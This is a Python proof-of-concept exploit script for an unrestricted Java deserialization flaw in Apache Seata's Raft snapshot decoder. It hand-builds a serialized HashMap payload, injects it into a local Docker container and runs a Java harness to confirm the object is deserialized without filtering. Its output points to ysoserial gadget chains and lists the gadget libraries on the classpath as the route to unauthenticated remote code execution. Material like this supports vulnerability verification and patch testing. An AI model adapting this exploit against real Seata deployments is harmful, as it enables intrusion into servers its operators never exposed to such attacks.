#!/usr/bin/env python3
# ---------------------------------------------------------------
# Exploit Title  : CVE-2025-32897 — Apache Seata RaftSnapshotSerializer Unrestricted Deserialization
# Affected        : Apache Seata 2.0.0 – 2.2.0 (Raft mode)
# Patched         : Apache Seata 2.3.0
# Author          : Exploit Intelligence Platform (EIP)
# Website         : https://exploit-intel.com
# Twitter/X       : @exploit_intel
# CVSS            : 9.8 CRITICAL
# CWE             : CWE-502 — Deserialization of Untrusted Data
# ---------------------------------------------------------------
"""
PoC for CVE-2025-32897 — Vector 2: RaftSnapshotSerializer Unrestricted Deserialization

Demonstrates that RaftSnapshotSerializer.decode() uses ObjectInputStream.readObject()
WITHOUT any resolveClass() override or JEP 290 deserialization filter, allowing
any Serializable class on the classpath to be deserialized.

This script constructs a malicious Java serialized object (HashMap) entirely in
Python using the Java Object Serialization Stream Protocol, then passes it to
RaftSnapshotSerializer.decode() inside the container.

This demonstrates:
  1. The serialized bytes are accepted by ObjectInputStream.readObject()
  2. The HashMap class is fully deserialized (no class filtering)
  3. In a real attack, a ysoserial gadget chain would execute arbitrary code
     during readObject(), BEFORE any ClassCastException occurs

The script also contrasts with RaftSyncMessageSerializer.decode() which HAS a
resolveClass() whitelist (PERMITS) that would reject the HashMap.
"""

import sys
import os
import struct
import subprocess

CONTAINER_NAME = "cve-2025-32897-vulnerable"
SEATA_CLASSPATH = "/seata-server/classes:/seata-server/libs/*"


def run_cmd(cmd, timeout=30):
    """Run a shell command and return (stdout, stderr, returncode)."""
    result = subprocess.run(
        cmd, shell=True, capture_output=True, text=True, timeout=timeout
    )
    return result.stdout.strip(), result.stderr.strip(), result.returncode


def docker_exec(cmd, timeout=30):
    """Execute a command inside the vulnerable container."""
    full_cmd = f'docker exec {CONTAINER_NAME} {cmd}'
    return run_cmd(full_cmd, timeout=timeout)


def get_container_ip():
    """Get the vulnerable container's IP."""
    stdout, _, _ = run_cmd(
        f'docker inspect {CONTAINER_NAME} '
        f'--format \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\''
    )
    return stdout.strip()


def build_java_serialized_hashmap():
    """
    Construct a Java serialized HashMap entirely in Python.

    This builds a valid Java Object Serialization Stream containing a
    java.util.HashMap with one entry: {"poc_key": "poc_value"}.

    The stream follows the Java Object Serialization Stream Protocol:
    https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html
    """
    import io

    buf = io.BytesIO()

    def write_magic():
        buf.write(b'\xac\xed')  # STREAM_MAGIC
        buf.write(b'\x00\x05')  # STREAM_VERSION

    def write_utf(s):
        """Write a modified UTF-8 string (2-byte length prefix)."""
        encoded = s.encode('utf-8')
        buf.write(struct.pack('>H', len(encoded)))
        buf.write(encoded)

    def write_string_object(s):
        """Write a TC_STRING."""
        buf.write(b'\x74')  # TC_STRING
        write_utf(s)

    # HashMap serialization format (from Java source):
    # ObjectStreamClass: java.util.HashMap, serialVersionUID
    # Fields: float loadFactor, int threshold
    # Then custom writeObject: int capacity, int size, then key-value pairs

    write_magic()

    # TC_OBJECT
    buf.write(b'\x73')  # TC_OBJECT

    # TC_CLASSDESC for java.util.HashMap
    buf.write(b'\x72')  # TC_CLASSDESC
    write_utf('java.util.HashMap')
    buf.write(struct.pack('>q', 362498820763181265))  # serialVersionUID: 0x0507DAC1C31660D1
    buf.write(b'\x03')  # SC_SERIALIZABLE | SC_WRITE_METHOD
    buf.write(struct.pack('>H', 2))  # 2 fields

    # Field 1: float loadFactor
    buf.write(b'F')  # typecode: float
    write_utf('loadFactor')

    # Field 2: int threshold
    buf.write(b'I')  # typecode: int
    write_utf('threshold')

    buf.write(b'\x78')  # TC_ENDBLOCKDATA
    buf.write(b'\x70')  # TC_NULL (no superclass)

    # Field values
    buf.write(struct.pack('>f', 0.75))  # loadFactor = 0.75
    buf.write(struct.pack('>i', 12))    # threshold = 12

    # Custom writeObject data for HashMap:
    # TC_BLOCKDATA containing: int capacity, int size
    capacity = 16
    size = 1
    block_data = struct.pack('>ii', capacity, size)
    buf.write(b'\x77')  # TC_BLOCKDATA
    buf.write(struct.pack('B', len(block_data)))  # block length
    buf.write(block_data)

    # Key-value pair: String "poc_key" -> String "poc_value"
    write_string_object('poc_key')
    write_string_object('poc_value')

    buf.write(b'\x78')  # TC_ENDBLOCKDATA (end of writeObject data)

    return buf.getvalue()


def main():
    print("=" * 70)
    print(" CVE-2025-32897 — Vector 2: RaftSnapshotSerializer PoC")
    print(" Unrestricted Java Object Deserialization")
    print("=" * 70)
    print()

    # Check container
    stdout, _, rc = run_cmd(f"docker inspect {CONTAINER_NAME} --format '{{{{.State.Status}}}}'")
    if rc != 0 or stdout != "running":
        print(f"[!] Container {CONTAINER_NAME} not running")
        sys.exit(1)

    vuln_ip = get_container_ip()
    print(f"[+] Target: {CONTAINER_NAME} ({vuln_ip})")
    print()

    # Build the payload in Python
    print("[*] Constructing Java serialized HashMap payload in Python...")
    payload = build_java_serialized_hashmap()
    print(f"  Payload size: {len(payload)} bytes")
    print(f"  First 32 bytes (hex): {payload[:32].hex()}")
    print(f"  Magic: 0x{payload[0]:02x}{payload[1]:02x} (Java serialization)")
    print()

    # Write payload to file and copy to container
    payload_path = "/tmp/snapshot_payload.bin"
    with open(payload_path, 'wb') as f:
        f.write(payload)
    run_cmd(f"docker cp {payload_path} {CONTAINER_NAME}:/tmp/snapshot_payload.bin")
    print(f"[+] Payload written and copied to container")
    print()

    # Write a minimal Java test that reads the payload and calls decode()
    java_code = '''
import java.io.*;
import java.nio.file.*;
import org.apache.seata.server.cluster.raft.snapshot.RaftSnapshotSerializer;

public class TestSnapshotDeserialize {
    public static void main(String[] args) throws Exception {
        System.out.println("[*] Reading payload from /tmp/snapshot_payload.bin");
        byte[] payload = Files.readAllBytes(Paths.get("/tmp/snapshot_payload.bin"));
        System.out.println("[*] Payload size: " + payload.length + " bytes");
        System.out.println("[*] Calling RaftSnapshotSerializer.decode()...");
        System.out.println("[*] If no resolveClass() filter exists, the HashMap will be deserialized");
        System.out.println();

        try {
            Object result = RaftSnapshotSerializer.decode(payload);
            System.out.println("[VULNERABLE] Object deserialized: " + result.getClass().getName());
        } catch (ClassCastException e) {
            // ClassCastException means ObjectInputStream.readObject() SUCCEEDED
            // but the result couldn't be cast to RaftSnapshot.
            // The object was FULLY DESERIALIZED before the cast.
            System.out.println("[VULNERABLE] HashMap was deserialized by ObjectInputStream!");
            System.out.println("  ClassCastException (AFTER deserialization): " + e.getMessage());
            System.out.println();
            System.out.println("  PROOF: ObjectInputStream.readObject() returned a HashMap object.");
            System.out.println("  There is NO resolveClass() override to restrict class loading.");
            System.out.println();
            System.out.println("  IMPACT: An attacker can send any ysoserial gadget chain payload.");
            System.out.println("  Gadget chains execute during readObject() (before the cast),");
            System.out.println("  achieving Remote Code Execution.");
            System.out.println();
            System.out.println("  Available gadget libraries on Seata classpath:");
            System.out.println("    - Spring Framework 5.3.39 (spring-core, spring-beans)");
            System.out.println("    - H2 Database 2.1.214");
            System.out.println("    - DM JDBC Driver (DmJdbcDriver18)");
            System.out.println("    - Jackson Databind 2.13.5");
            System.out.println("    - Guava, Apache Commons, etc.");
        } catch (Exception e) {
            System.out.println("[!] Exception: " + e.getClass().getName() + ": " + e.getMessage());
        }
    }
}
'''

    # Deploy and run
    java_path = "/tmp/TestSnapshotDeserialize.java"
    with open(java_path, 'w') as f:
        f.write(java_code)
    run_cmd(f"docker cp {java_path} {CONTAINER_NAME}:/tmp/TestSnapshotDeserialize.java")

    print("[*] Compiling test program inside container...")
    stdout, stderr, rc = docker_exec(
        f'javac -cp "{SEATA_CLASSPATH}" /tmp/TestSnapshotDeserialize.java'
    )
    if rc != 0:
        print(f"[!] Compilation failed: {stderr}")
        sys.exit(1)
    print("[+] Compiled successfully")
    print()

    print("[*] Running exploit...")
    print("-" * 70)
    stdout, stderr, rc = docker_exec(
        f'java -cp "/tmp:{SEATA_CLASSPATH}" TestSnapshotDeserialize',
        timeout=15
    )
    print(stdout)
    if stderr:
        for line in stderr.split('\n'):
            if 'WARN' not in line and 'INFO' not in line and line.strip():
                print(f"[stderr] {line}")
    print("-" * 70)
    print()

    # Results
    confirmed = "[VULNERABLE]" in stdout
    print("=" * 70)
    print(f" Result: {'CONFIRMED — VULNERABLE' if confirmed else 'UNVERIFIED'}")
    print(f" Vector: RaftSnapshotSerializer.decode() — unrestricted deserialization")
    print(f" Impact: ysoserial gadget chains → unauthenticated RCE")
    print("=" * 70)

    return 0 if confirmed else 1


if __name__ == "__main__":
    sys.exit(main())
